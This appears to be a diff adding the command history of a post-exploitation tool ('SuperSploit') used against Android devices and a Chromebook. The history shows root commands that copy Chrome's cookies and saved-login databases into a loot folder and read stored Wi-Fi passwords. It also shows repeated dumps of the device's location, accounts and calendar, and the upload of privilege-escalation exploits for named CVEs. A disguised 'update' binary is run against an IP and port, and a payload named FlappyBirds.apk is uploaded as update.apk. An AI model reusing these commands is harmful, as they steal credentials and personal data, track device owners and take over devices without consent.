@@ -1,0 +1,756 @@
+
+# 2026-06-06 19:53:25.348084
++ls
+
+# 2026-06-06 19:53:28.794484
++clear
+
+# 2026-06-06 19:54:16.492722
++su -c "cp /data/data/com.android.chrome/app_chrome/Default/Cookies /sdcard/Cookies.db" && su -c "cp '/data/data/com.android.chrome/app_chrome/Default/Login Data' /sdcard/Logins.db"
+
+# 2026-06-06 19:55:27.310825
++download /sdcard/Logins.db
+
+# 2026-06-06 19:56:01.121935
++download /sdcard/Logins.db .data/.loot/Logins
+
+# 2026-06-06 19:56:19.401738
++bg
+
+# 2026-06-06 19:57:21.109713
++su -c "cp /data/data/com.android.chrome/app_chrome/Default/Cookies /sdcard/Cookies.db"
+
+# 2026-06-06 19:58:04.045933
++su -c dumpsys location | grep "LastLocation"
+
+# 2026-06-06 19:58:13.230637
++su -c dumpsys location | grep "Last"
+
+# 2026-06-06 19:58:43.439146
++su -c dumpsys location | grep "last"
+
+# 2026-06-06 19:59:04.178514
++su -c dumpsys location | grep "location"
+
+# 2026-06-06 20:07:18.620203
++su -c dumpsys location | grep "Location"
+
+# 2026-06-06 20:07:30.019888
++su -c dumpsys location | grep "gps Location"
+
+# 2026-06-06 20:07:36.684713
++su -c dumpsys location | grep "GPS Location"
+
+# 2026-06-06 20:07:54.453269
++su -c dumpsys location | grep "Last Location"
+
+# 2026-06-06 20:07:58.117391
++su -c dumpsys location | grep "LastLocation"
+
+# 2026-06-06 20:08:02.174377
++su -c dumpsys location | grep "Last"
+
+# 2026-06-06 20:09:41.072556
++su -c dumpsys location | grep -i "last location"
+
+# 2026-06-06 20:09:47.848545
++su -c dumpsys location | grep -i "location"
+
+# 2026-06-06 20:10:54.275521
++su -c dumpsys account
+
+# 2026-06-06 20:11:22.220796
++dumpsys
+
+# 2026-06-06 20:11:57.738662
++clear
+
+# 2026-06-06 20:12:09.925905
++content query --uri content://com.android.calendar/events
+
+# 2026-06-06 20:13:24.792675
++su -c "cat /data/misc/wifi/wpa_supplicant.conf"
+
+# 2026-06-06 20:14:37.340464
++su -c "cat /data/misc/wifi/WifiConfigStore.xml"
+
+# 2026-06-07 11:04:40.670637
++id
+
+# 2026-06-07 11:05:58.595527
++help
+
+# 2026-06-07 11:06:21.638998
++exit
+
+# 2026-06-07 11:09:35.191419
++clear
+
+# 2026-06-07 11:09:35.981544
++ls
+
+# 2026-06-07 11:09:42.430106
++su -c id
+
+# 2026-06-07 11:09:44.789592
++clear
+
+# 2026-06-07 11:10:27.693103
++get_location
+
+# 2026-06-07 11:11:17.005872
++bg
+
+# 2026-06-07 16:50:17.899895
++clear
+
+# 2026-06-07 16:50:22.754429
++background
+
+# 2026-06-07 16:51:49.577202
++upload /home/donald/.SuperSploit/payloads/android_lpe_enum_android_v7
+
+# 2026-06-07 16:52:02.312030
++upload /home/donald/.SuperSploit/payloads/android_lpe_enum_android_v7 lpe
+
+# 2026-06-07 16:52:04.854686
++ls
+
+# 2026-06-07 16:52:14.863155
++ls lpe
+
+# 2026-06-07 16:52:33.615848
++upload /home/donald/.SuperSploit/payloads/android_lpe_enum_android_v7 /data/local/tmp/lpe
+
+# 2026-06-07 16:52:45.880294
++ls /data/local/tmp
+
+# 2026-06-07 16:52:58.416202
++cd /sdcard
+
+# 2026-06-07 16:52:59.584762
++ls
+
+# 2026-06-07 16:53:08.337164
++pwd
+
+# 2026-06-07 16:53:14.441465
++cd /sdcard/
+
+# 2026-06-07 16:53:16.161415
++ls
+
+# 2026-06-07 16:53:19.993163
++pwd
+
+# 2026-06-07 16:53:32.553638
++ls /storage/
+
+# 2026-06-07 16:53:39.306302
++ls /storage/emulated/0/
+
+# 2026-06-07 16:55:07.277581
++su -c dumpsys package org.supersploit.stub
+
+# 2026-06-07 17:10:31.060997
++help
+
+# 2026-06-07 17:10:38.994834
++persis
+
+# 2026-06-07 17:10:58.343947
++clear
+
+# 2026-06-07 17:11:07.312437
++help auto_root
+
+# 2026-06-07 17:11:23.296422
++bg
+
+# 2026-06-07 17:20:34.705655
++upload /home/donald/.SuperSploit/payloads/android/FlappyBirds.apk /tmp/update.apk
+
+# 2026-06-07 19:01:38.033232
++ls
+
+# 2026-06-08 10:51:29.548938
++up
+
+# 2026-06-08 10:52:01.907386
++search payloads
+
+# 2026-06-08 10:52:15.930713
++load 79
+
+# 2026-06-08 10:52:29.259769
++load payload 79
+
+# 2026-06-08 10:52:48.777837
++bg
+
+# 2026-06-08 10:53:21.398025
++load payloads/android_lpe_cve_lookup_android_arm64
+
+# 2026-06-08 10:54:05.805534
++upload payloads/android_lpe_cve_lookup_android_arm64 /data/local/tmp/cve_lookup
+
+# 2026-06-08 10:54:47.846316
++upload payloads/android_lpe_cve_lookup_android_arm64 /tmp/cve_lookup
+
+# 2026-06-08 10:55:04.343755
++chmod +x /tmp/cve_lookup
+
+# 2026-06-08 10:55:24.575008
++ls -al /tmp/cve_lookup
+
+# 2026-06-08 10:56:02.543789
++clear
+
+# 2026-06-08 10:56:05.143662
++ls -al /tmp/cve_lookup
+
+# 2026-06-08 11:00:11.323963
++id
+
+# 2026-06-08 11:00:23.739855
++clear
+
+# 2026-06-08 11:00:25.221228
++help
+
+# 2026-06-08 11:00:34.509238
++dump_wifi
+
+# 2026-06-08 11:00:49.966311
++pm
+
+# 2026-06-08 11:00:55.725117
++adb shell pm
+
+# 2026-06-08 11:01:11.629836
++clear
+
+# 2026-06-08 11:01:20.949613
++ls /data/local/tmp
+
+# 2026-06-08 11:01:27.501616
++ls /tmp
+
+# 2026-06-08 11:01:47.294614
++./tmp/cve_lookup
+
+# 2026-06-08 11:02:37.384019
++mv /tmp/cve_lookup /sdcard/cve
+
+# 2026-06-08 11:02:40.637350
++ls /
+
+# 2026-06-08 11:02:44.903269
++ls /home
+
+# 2026-06-08 11:02:53.604502
++id
+
+# 2026-06-08 11:02:57.920139
++whoami
+
+# 2026-06-08 11:03:13.839819
++adb shell whoami
+
+# 2026-06-08 11:03:21.255946
++adb shell id
+
+# 2026-06-08 11:03:58.224607
++mv /tmp/cve_lookup /home/donaldford05091997/cve
+
+# 2026-06-08 11:04:14.657619
++cd /home/donaldford05091997
+
+# 2026-06-08 11:04:16.905612
++pwd
+
+# 2026-06-08 11:04:19.063854
++clear
+
+# 2026-06-08 11:04:19.865520
++ls
+
+# 2026-06-08 11:04:37.281374
++chmod +x cve
+
+# 2026-06-08 11:04:40.297910
++./cve
+
+# 2026-06-08 11:04:47.681792
++uname -a
+
+# 2026-06-08 11:04:56.858223
++adb shell uname -a
+
+# 2026-06-08 11:05:53.346201
++bg
+
+# 2026-06-08 11:19:25.001638
++uname -a
+
+# 2026-06-08 11:20:02.332149
++pwd
+
+# 2026-06-08 11:20:04.300375
++ls
+
+# 2026-06-08 11:20:27.703691
++adb push cve /data/local/tmp/cve
+
+# 2026-06-08 11:20:43.911575
++adb shell
+
+# 2026-06-08 11:24:19.547393
++clear
+
+# 2026-06-08 11:25:06.003119
++upload /home/donald/.SuperSploit/payloads/drs_x86_64 /home/donaldford05091997/update
+
+# 2026-06-08 11:25:24.371815
++cd /home/donaldford05091997
+
+# 2026-06-08 11:25:29.172099
++chmod +x update
+
+# 2026-06-08 11:26:18.990377
++adb push update /data/local/tmp/update
+
+# 2026-06-08 11:26:22.222340
++bg
+
+# 2026-06-08 11:27:14.370468
++adb shell /data/local/tmp/update
+
+# 2026-06-08 11:27:47.953827
++adb shell ls /data/local/tmp/
+
+# 2026-06-08 11:28:07.042693
++adb shell /data/local/tmp/update
+
+# 2026-06-08 11:28:56.732957
++adb shell cd /data/local/tmp && ./update
+
+# 2026-06-08 11:29:10.285096
++ls
+
+# 2026-06-08 11:29:19.773585
++adb shell cd /data/local/tmp && adb shell ./update
+
+# 2026-06-08 11:29:33.358211
++adb shell pwd
+
+# 2026-06-08 11:30:07.831799
++adb shell -c cd /data/local/tmp && pwd
+
+# 2026-06-08 11:30:15.279575
++adb shell -c cd /data/local/tmp && adb shell pwd
+
+# 2026-06-08 11:30:25.072215
++adb shell cd /data/local/tmp && adb shell pwd
+
+# 2026-06-08 11:38:06.193484
++clear
+
+# 2026-06-08 11:38:09.880755
++upload /home/donald/.SuperSploit/payloads/drs_android_x86_64 /home/donaldford05091997/update
+
+# 2026-06-08 11:38:15.201073
++bg
+
+# 2026-06-08 11:40:32.335007
++upload /home/donald/.SuperSploit/payloads/drs_android_x86_64 /home/donaldford05091997/update
+
+# 2026-06-08 11:40:39.933920
++c
+
+# 2026-06-08 11:40:42.965567
++clear
+
+# 2026-06-08 11:40:44.566113
++upload /home/donald/.SuperSploit/payloads/drs_android_x86_64 /home/donaldford05091997/update
+
+# 2026-06-08 11:40:59.494653
++adb push update /data/local/tmp/update
+
+# 2026-06-08 11:41:02.214626
++ls
+
+# 2026-06-08 11:41:09.878903
++cd /home/donaldford05091997
+
+# 2026-06-08 11:41:12.182979
++adb push update /data/local/tmp/update
+
+# 2026-06-08 11:41:18.119226
++adb shell ls /data/local/tmp/
+
+# 2026-06-08 11:41:43.495667
++adb shell chmod +x /data/local/tmp/update
+
+# 2026-06-08 11:41:53.040455
++adb shell /data/local/tmp/update
+
+# 2026-06-08 11:43:11.059821
++adb shell /data/local/tmp/update 192.168.191.158 5000
+
+# 2026-06-08 11:55:24.995964
++adb shell /data/local/tmp/update 192.168.191.158 9997
+
+# 2026-06-08 12:00:53.390506
++upload /home/donald/.SuperSploit/payloads/drs_android_x86_64 /home/donaldford05091997/update
+
+# 2026-06-08 12:01:55.583905
++ls 
+
+# 2026-06-08 12:01:59.399732
++clear
+
+# 2026-06-08 12:02:27.273440
++upload /home/donald/.SuperSploit/payloads/drs_android_x86_64 /home/donaldford05091997/update
+
+# 2026-06-08 12:03:47.736616
++ls
+
+# 2026-06-08 12:03:50.321527
++id
+
+# 2026-06-08 12:04:40.597815
++bg
+
+# 2026-06-08 12:31:24.094360
++upload /home/donald/.SuperSploit/payloads/drs_android_x86_64 /home/donaldford05091997/update
+
+# 2026-06-08 12:31:48.174009
++adb shell /data/local/tmp/update 192.168.191.158 9999
+
+# 2026-06-08 12:33:45.739502
++adb p
+
+# 2026-06-08 12:33:50.379538
++adb push update /data/local/tmp/update
+
+# 2026-06-08 12:33:56.371296
++clear
+
+# 2026-06-08 12:33:59.907423
++cd /home/donaldford05091997
+
+# 2026-06-08 12:34:03.419626
++adb push update /data/local/tmp/update
+
+# 2026-06-08 12:34:08.435830
++adb shell /data/local/tmp/update 192.168.191.158 9999
+
+# 2026-06-08 12:57:39.643288
++exit
+
+# 2026-06-08 13:09:48.877973
++ls
+
+# 2026-06-08 13:09:53.341381
++./cve
+
+# 2026-06-08 13:09:59.084600
++bg
+
+# 2026-06-08 13:15:32.615556
++upload /home/donald/.SuperSploit/payloads/android_lpe_cve_lookup_android_x86_64 /home/donaldford05091997/cve2
+
+# 2026-06-08 13:15:43.078645
++cd /home/donaldford05091997
+
+# 2026-06-08 13:15:46.350482
++./cve2
+
+# 2026-06-08 13:16:01.502694
++chmod +x cve2
+
+# 2026-06-08 13:16:03.838731
++./cve2
+
+# 2026-06-08 13:17:07.327209
++./cve2 > chromeBookdev_envoirment
+
+# 2026-06-08 13:17:49.663434
++adb push cve2 /data/local/tmp/cve2
+
+# 2026-06-08 13:18:07.511653
++adb shell /data/local/tmp/cve2 > out.txt
+
+# 2026-06-08 13:18:37.452732
++ls
+
+# 2026-06-08 13:19:17.111961
++bg
+
+# 2026-06-08 13:32:54.287251
++upload /home/donald/.SuperSploit/payloads/exhaustive_android_audit_android_x86_64 /home/donaldford05091997/check
+
+# 2026-06-08 13:33:02.979351
++clear
+
+# 2026-06-08 13:33:13.187295
++cd /home/donaldford05091997
+
+# 2026-06-08 13:33:19.201611
++chmod +x check
+
+# 2026-06-08 13:33:23.447587
++./check
+
+# 2026-06-08 13:34:13.070542
++sudo -c id
+
+# 2026-06-08 13:34:18.468055
++sudo id
+
+# 2026-06-08 13:34:22.401560
++clear
+
+# 2026-06-08 13:34:26.256153
++sudo id
+
+# 2026-06-08 13:34:59.388194
++adb push check /data/local/tmp/check
+
+# 2026-06-08 13:36:12.279440
++adb shell chmod +x /data/local/tmp/check
+
+# 2026-06-08 13:36:30.306267
++adb shell /data/local/tmp/check
+
+# 2026-06-08 13:37:33.051480
++adb shell /data/local/tmp/check > check_output_chromebook
+
+# 2026-06-08 13:47:12.897617
++bg
+
+# 2026-06-08 13:50:12.478224
++background
+
+# 2026-06-08 13:50:54.159396
++cd /home/donaldford05091997
+
+# 2026-06-08 13:51:18.415795
++upload /home/donald/.SuperSploit/payloads/android-enum3_android_x86_64 enum3
+
+# 2026-06-08 13:52:18.171916
++ls
+
+# 2026-06-08 13:52:27.141950
++chmod +x enum3
+
+# 2026-06-08 13:52:30.589202
++./enum3
+
+# 2026-06-08 13:52:50.254278
++adb push enum3 /data/local/tmp/check
+
+# 2026-06-08 13:52:58.342543
++adb shell chmod +x /data/local/tmp/check
+
+# 2026-06-08 13:53:11.071121
++adb shell /data/local/tmp/check
+
+# 2026-06-08 13:54:17.457990
++adb shell /data/local/tmp/check > check_output_chromebook
+
+# 2026-06-08 13:55:26.629523
++bg
+
+# 2026-06-08 14:17:06.083398
++ls
+
+# 2026-06-08 14:17:11.738600
++clear
+
+# 2026-06-08 14:17:18.130694
++bg
+
+# 2026-06-08 14:18:47.574496
++ls
+
+# 2026-06-08 14:18:52.509489
++uname -a
+
+# 2026-06-08 14:19:00.221607
++adb shell /data/local/tmp/check > check_output_chromebook
+
+# 2026-06-08 14:19:10.061866
++bg
+
+# 2026-06-08 14:27:57.217252
++upload /home/donald/.SuperSploit/payloads/android-cve-lookup_android_x86_64 /home/donaldford050997/cve_lookup
+
+# 2026-06-08 14:28:30.201852
++pwd
+
+# 2026-06-08 14:28:37.969958
++upload /home/donald/.SuperSploit/payloads/android-cve-lookup_android_x86_64 /home/donaldford050997/cve_lookup lookup
+
+# 2026-06-08 14:29:00.328906
++upload /home/donald/.SuperSploit/payloads/android-cve-lookup_android_x86_64 lookup
+
+# 2026-06-08 14:29:14.713730
++clear
+
+# 2026-06-08 14:29:21.012853
++chmod +x lookup
+
+# 2026-06-08 14:29:25.450329
++./lookup
+
+# 2026-06-08 14:29:56.677739
++adb push lookup /data/local/tmp/check
+
+# 2026-06-08 14:30:03.418368
++adb shell chmod +x /data/local/tmp/check
+
+# 2026-06-08 14:30:13.019068
++adb shell /data/local/tmp/check
+
+# 2026-06-08 14:30:40.243211
++bg
+
+# 2026-06-08 16:44:17.156943
++id
+
+# 2026-06-08 16:44:20.483907
++sudo -s
+
+# 2026-06-08 16:52:06.872639
++clear
+
+# 2026-06-08 16:52:26.248667
++adb shell id
+
+# 2026-06-08 16:52:31.713036
++adb devices
+
+# 2026-06-08 16:52:58.458638
++bg
+
+# 2026-06-08 17:03:09.208291
++upload /home/donald/.SuperSploit/payloads/android-enum3_android_x86_64 enum3
+
+# 2026-06-08 17:03:51.025591
++chmod +x enum3
+
+# 2026-06-08 17:03:54.682332
++./enum3
+
+# 2026-06-08 17:04:44.084871
++adb push enum3 /data/local/tmp/check
+
+# 2026-06-08 17:04:56.069523
++adb devices
+
+# 2026-06-08 17:05:02.150094
++adb disconnect
+
+# 2026-06-08 17:05:04.150052
++adb devices
+
+# 2026-06-08 17:05:08.574522
++adb push enum3 /data/local/tmp/check
+
+# 2026-06-08 17:05:23.999590
++adb shell chmod +x /data/local/tmp/check
+
+# 2026-06-08 17:05:29.607666
++adb shell /data/local/tmp/check
+
+# 2026-06-08 17:10:18.265326
++clear
+
+# 2026-06-08 17:10:21.528772
++show
+
+# 2026-06-08 17:10:24.113157
++clear
+
+# 2026-06-08 17:10:26.545549
++help
+
+# 2026-06-08 17:10:37.370120
++get_location
+
+# 2026-06-08 17:10:51.882963
++adb shell dumpsys location
+
+# 2026-06-08 17:11:02.179596
++ ultra_enum_v5_audit_summary.md inclear
+
+# 2026-06-08 17:11:04.787266
++clear
+
+# 2026-06-08 17:11:24.733078
++adb shell dumpsys location | "last location"
+
+# 2026-06-08 17:11:27.941402
++adb shell dumpsys location | "lastlocation"
+
+# 2026-06-08 17:11:41.047272
++adb shell dumpsys location | grep "last location"
+
+# 2026-06-08 17:11:49.727538
++adb shell dumpsys location | grep "lastlocation"
+
+# 2026-06-08 17:11:57.862884
++adb shell dumpsys location | grep "location"
+
+# 2026-06-08 17:12:06.055556
++adb shell dumpsys location | grep -r "location"
+
+# 2026-06-08 17:16:11.079300
++search exploits lpe
+
+# 2026-06-08 17:16:34.423112
++load exploits/linux/cve_2024_1086_nftables.c 
+
+# 2026-06-08 17:16:52.553531
++cve_2024_1086_nftables_out()
+
+# 2026-06-08 17:17:18.161694
++id
+
+# 2026-06-08 17:17:41.627554
++bd
+
+# 2026-06-08 17:17:44.323781
++bg
+
+# 2026-06-08 17:18:50.152784
++upload /home/donald/.SuperSploit/payloads/cve_2024_1086_nftables_android_x86_64 lpe
+
+# 2026-06-08 17:19:33.946581
++adb push lpe /data/local/tmp/check
+
+# 2026-06-08 17:19:40.106664
++adb shell chmod +x /data/local/tmp/check
+
+# 2026-06-08 17:19:49.180915
++adb shell /data/local/tmp/check
+
+# 2026-06-08 17:20:11.365171
++bg
+
+# 2026-06-08 17:22:40.299492
++upload /home/donald/.SuperSploit/payloads/cve_2022_20409_dirty_cred_android_x86_64 check
+
+# 2026-06-08 17:23:02.214892
++ls
+
+# 2026-06-08 17:23:07.653996
++./enum3
+
+# 2026-06-08 17:26:27.926833
++upload /home/donald/.SuperSploit/payloads/android-enum3_android_x86_64 enum3
+
+# 2026-06-08 17:27:34.045871
++exit
